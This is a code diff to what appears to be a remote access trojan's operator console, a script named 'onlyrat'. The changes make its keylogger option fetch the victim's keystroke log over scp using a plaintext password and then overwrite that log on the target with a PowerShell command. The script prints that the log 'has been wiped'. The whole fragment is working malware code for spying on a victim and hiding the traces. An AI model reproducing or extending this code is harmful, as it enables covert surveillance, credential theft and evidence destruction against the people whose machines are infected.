@@ -128,9 +128,10 @@ def remote_download(address, password, path):
     print("\n[*] Starting Download...")
 
     # scp download
+    os.system("mkdir ~/Downloads")
     os.system(f"sshpass -p \"{password}\" scp -r onlyrat@{address}:{path} ~/Downloads")
 
-    print("[+] Download complete\n")
+    print("[+] Download saved to \"~/Downloads\"\n")
 
 # run commands remotely with SCP
 def remote_command(address, password, command):
@@ -256,7 +257,11 @@ def cli(arguments):
             
             # grab keylogs option
             elif option == "2":
-                remote_download(ipv4, password, f"{working_direcory}/{username}.log")
+                remote_download(ipv4, password, f"{working_direcory}/{target_username}.log")
+                remote_command(ipv4, password, f"powershell New-Item -Path {working_direcory}/{target_username}.log -ItemType File -Force")
+
+                print("[+] Log file saved to \"~/Downloads\"")
+                print("[+] Log file on target has been wiped\n")
 
             # restart target option
             elif option == "3":
@@ -269,7 +274,7 @@ def cli(arguments):
             # display config file info
             elif option == "c" or option == "config":
                 print_config(configuration)
-                print(f"USERNAME : {username}")
+                print(f"USERNAME : {target_username}")
             
             # get version number
             elif option == "v" or option == "version":
